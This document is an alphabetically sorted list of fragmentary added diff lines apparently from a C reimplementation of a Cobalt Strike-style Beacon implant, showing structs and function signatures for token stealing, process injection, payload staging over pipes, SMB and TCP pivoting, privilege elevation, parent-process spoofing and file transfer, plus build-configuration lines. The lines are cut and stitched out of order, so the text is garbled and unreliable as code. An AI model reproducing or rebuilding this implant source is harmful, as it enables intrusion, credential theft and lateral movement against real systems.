+t%I64d
+te32))
+threadInfo->lpStartAddress(threadInfo->lpParameter)
+tiff
+timeout)
+toRead -= read
+toWideChar
+tokenPrivileges.PrivilegeCount = 0
+tokenPrivileges.PrivilegeCount = 1
+tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+tokenPrivileges.Privileges[0].Luid))
+tokenPrivileges.Privileges[0].Luid.HighPart = 0
+total 
+totalRead 
+transform)
+transform->bodyLength = 0
+transform->bodyLength = transformedLength
+transform->outputLength = max(3 
+transform->uriParams)
+transformedLength 
+transformedLength = ToNetbios(step == STEP_NETBIOSU 
+transformedLength = outlen
+transformedLength = response_len
+transformedLength = session_len
+type = CALLBACK_CLOSE
+type = CALLBACK_CONNECT
+type = ERROR_INJECT_X64_INTO_X86
+type = ERROR_INJECT_X86_INTO_X64
+type = ERROR_SPAWN_PROCESS_AS_USER_FAILED
+type = ERROR_SPAWN_TOKEN_EXTENDED_STARTUPINFO
+typedef BOOL(WINAPI
+typedef CLIENT_ID
+typedef HANDLE(WINAPI
+typedef NTSTATUS(NTAPI
+typedef WINBASEAPI BOOL(WINAPI
+typedef WINBASEAPI FARPROC(WINAPI
+typedef WINBASEAPI HMODULE(WINAPI
+typedef WINBASEAPI LPVOID(WINAPI
+typedef datap formatp
+typedef enum _SECTION_INHERIT {
+typedef struct
+typedef struct CHANNEL_ENTRY
+typedef struct DOWNLOAD_CHUNK
+typedef struct DOWNLOAD_ENTRY
+typedef struct RECORD
+typedef struct RECORD_ENTRY
+typedef struct SESSION
+typedef struct STRATEGY
+typedef struct THREAD_INFO {
+typedef struct TRANSFORM
+typedef struct WEB_RESPONSE
+typedef struct _APC_ROUTINE_CONTEXT
+typedef struct _ARGUMENT_ENTRY
+typedef struct _EXPANDED_CMD
+typedef struct _INJECTION
+typedef struct _JOB_ENTRY
+typedef struct _LINK_ENTRY
+typedef struct _PAYLOAD
+typedef struct _PROTOCOL {
+typedef struct _RELOCATION
+typedef struct _ROUTE_DATA
+typedef struct _RUN_UNDER_CONFIG
+typedef struct _RUN_UNDER_CONTEXT {
+typedef struct _bapi
+typedef struct {
+typedef union _CHANNEL {
+u_long
+u_long bid = htonl(gLinks[i].bid)
+unsigned char
+unsigned int outputLength
+unsigned long e_value
+unsigned long outlen
+unsigned short r_type
+va_end(args)
+va_list args
+value = htonl(value)
+value = htons(value)
+void
+void 
+void    BeaconDataFree(datap 
+void    BeaconDataParse(datap 
+void    BeaconDataZero(datap 
+void    BeaconFormatAlloc(formatp 
+void    BeaconFormatAppend(formatp 
+void    BeaconFormatChar(formatp 
+void    BeaconFormatFree(formatp 
+void    BeaconFormatInt(formatp 
+void    BeaconFormatPrintf(formatp 
+void    BeaconFormatReset(formatp 
+void    BeaconFormatShort(formatp 
+void    BeaconFormatUse(formatp 
+void   BeaconCleanupProcess(PROCESS_INFORMATION 
+void   BeaconInformation(BEACON_INFO 
+void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION
+void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION 
+void   BeaconRevertToken(void)
+void (
+void ArgumentAdd(char
+void ArgumentList()
+void ArgumentRemove(char
+void BeaconAPI(bapi
+void BeaconCleanupProcess(PROCESS_INFORMATION
+void BeaconDataFree(datap
+void BeaconDataParse(datap
+void BeaconDataStoreProtectItem(size_t index)
+void BeaconDataStoreUnprotectItem(size_t index)
+void BeaconDataZero(datap
+void BeaconErrorNA(int type)
+void BeaconFormatAlloc(formatp
+void BeaconFormatAppend(formatp
+void BeaconFormatChar(formatp
+void BeaconFormatFree(formatp
+void BeaconFormatInt(formatp
+void BeaconFormatPrintf(formatp
+void BeaconFormatReset(formatp
+void BeaconFormatShort(formatp
+void BeaconFormatUse(formatp
+void BeaconInjectProcessInternal(PROCESS_INFORMATION
+void BeaconRevertToken(void)
+void BlockDlls(char
+void ChannelClose(char
+void ChannelConnect(char
+void ChannelHandleActivity()
+void ChannelHandleAll(void)
+void ChannelLSocketBind(char
+void ChannelLSocketClose(char
+void ChannelLSocketTcpPivot(char
+void ChannelListen(char
+void ChannelRemoveAllInactive()
+void ChannelSend(char
+void CleanupChildProcessContext(PRUN_UNDER_CONTEXT context)
+void CleanupParentProcessContext(PRUN_UNDER_CONTEXT context)
+void CryptoSetupSha256AES(char
+void Die(void)
+void DownloadCancel(char
+void DownloadCloseSafely(DOWNLOAD_ENTRY
+void DownloadDo(char
+void DownloadFileChunk(DOWNLOAD_ENTRY
+void DownloadHandleAll(int chunkMaxSize)
+void EncryptSessionData(char
+void Execute(char
+void FilesystemCd(char
+void FilesystemCopy(char
+void FilesystemDrives(char
+void FilesystemFindAndProcess(char
+void FilesystemList(char
+void FilesystemMkdir(char
+void FilesystemMove(char
+void FilesystemPwd()
+void FilesystemRemove(char
+void FilesystemRemoveDirectoryChildren(char
+void FilesystemRemoveRecursiveCallback(const char
+void IdentityConditionalImpersonate(BOOL ignoreToken)
+void IdentityConditionalRevert(BOOL ignoreToken)
+void IdentityElevatePost()
+void IdentityElevatePre(char
+void IdentityElevationThread(LPVOID lpThreadParameter)
+void IdentityGetPrivileges(char
+void IdentityGetPrivilegesInternal(char
+void IdentityGetUid(void)
+void IdentityGetUidInternal(HANDLE hToken)
+void IdentityImpersonateToken(void)
+void IdentityLoginUser(char
+void IdentityLoginUserInternal(char
+void IdentityRevertToken(void)
+void IdentityStealToken(char
+void InjectAndExecute(INJECTION
+void InjectIntoPid(char
+void InjectIntoPidAndPing(char
+void InlineExecuteObject(char
+void JobCleanup()
+void JobExecute(char
+void JobExecuteInternal(char
+void JobKill(char
+void JobPrintAll()
+void JobRegister(char
+void JobSpawn(char
+void LinkViaTcp(char
+void MemoryCleanup()
+void MemoryInsert(char
+void MetadataGenerate(char
+void NetworkClose(void)
+void NetworkInit(void)
+void NetworkPost(const char
+void NetworkUpdateSettings(HINTERNET hInternet)
+void Pause(char
+void PingHandle()
+void PipeClose(char
+void PipeCloseInternal(int bid)
+void PipeReopen(char
+void PipeRoute(char
+void PowershellHostTcp(char
+void ProcThreadAttributeListDestroy(LPVOID lpAttributeList)
+void ProcessList(char
+void ProtocolSmbClose(PROTOCOL
+void ProtocolSmbFlush(PROTOCOL
+void ProtocolSmbOpenExplicit(char
+void ProtocolTcpClose(PROTOCOL
+void RunAsUser(char
+void RunSetParentPid(char
+void RunUnderPid(char
+void SleepSet(char
+void Spawn(char
+void SpawnAndPing(char
+void SpawnAsUser(char
+void SpawnSetTo(char
+void SpawnUnder(char
+void StagePayloadViaPipe(char
+void TaskProcess(char
+void TransformDestroy(TRANSFORM
+void TransformEncode(TRANSFORM
+void TransformInit(TRANSFORM
+void Upload(char
+void WebResponseDestroy(WEB_RESPONSE
+void WebResponseThread(WEB_RESPONSE
+void WebServerLocal(char
+void(__stdcall
+waitAndClose:
+waitForData)(struct _PROTOCOL
+wdata = BeaconDataBuffer(
+wdata = NULL
+webResponse->content = malloc(contentLength)
+webResponse->contentLength = contentLength
+webResponse->data = malloc(MAX_DATA_SIZE)
+webResponse->header = malloc(MAX_HEADER_SIZE)
+webResponse->headerLength = strlen(webResponse->header)
+webResponse->socket = socket
+while (ChannelReceiveData() > 0 
+while (GetTickCount() < timeout)
+while (TRUE)
+while (char method = BeaconDataByte(
+while (i < size)
+while (job->next)
+while (timeout < GetTickCount())
+while (toRead)
+while (total < length)
+while (totalBytesRead < maxGet)
+while(GetTickCount() < timeout)
+while(TRUE)
+while(current 
+while(totalBytesAvail)
+write)(struct _PROTOCOL
+writefds)
+writefds))
+wrote) 
+wrote))
+wsaData))
+wwwroot/
+x64 = Debug
+x64 = Release
+x64.ActiveCfg = Debug
+x64.ActiveCfg = Release
+x64.Build.0 = Debug
+x64.Build.0 = Release
+x64/
+x86 = Debug
+x86 = Release
+x86.ActiveCfg = Debug
+x86.ActiveCfg = Release
+x86.Build.0 = Debug
+x86.Build.0 = Release
+x86/
+xsd</Extensions>
+{42109FEE-B0B9-4FCD-9E56-2863BF8C55D2}.Debug
+{42109FEE-B0B9-4FCD-9E56-2863BF8C55D2}.Release
+{95502B5E-5763-4EC5-A64C-1E9E33409E2F}.Debug
+{95502B5E-5763-4EC5-A64C-1E9E33409E2F}.Release
+{E3802982-DCB6-4D85-A2BD-6B08F0657E79}.Debug
+{E3802982-DCB6-4D85-A2BD-6B08F0657E79}.Release
+} ARGUMENT_ENTRY
+} BEACON_INFO
+} CHANNEL
+} CHANNEL_ENTRY
+} DOWNLOAD_CHUNK
+} DOWNLOAD_ENTRY
+} EXPANDED_CMD
+} HEAP_RECORD
+} INJECTION
+} JOB_ENTRY
+} LINK_ENTRY
+} PAYLOAD
+} PROTOCOL
+} RECORD_ENTRY
+} RELOCATION
+} ROUTE_DATA
+} RUN_UNDER_CONFIG
+} SESSION
+} STRATEGY
+} TRANSFORM
+} bapi
+} datap
+} else
+} else if (gIdentityToken)
+} else if(entry->allocType == ALLOC_TYPE_VIRTUALALLOC)
+} else {
+} sizedbuf
+} while (remaining > 0)
+}else
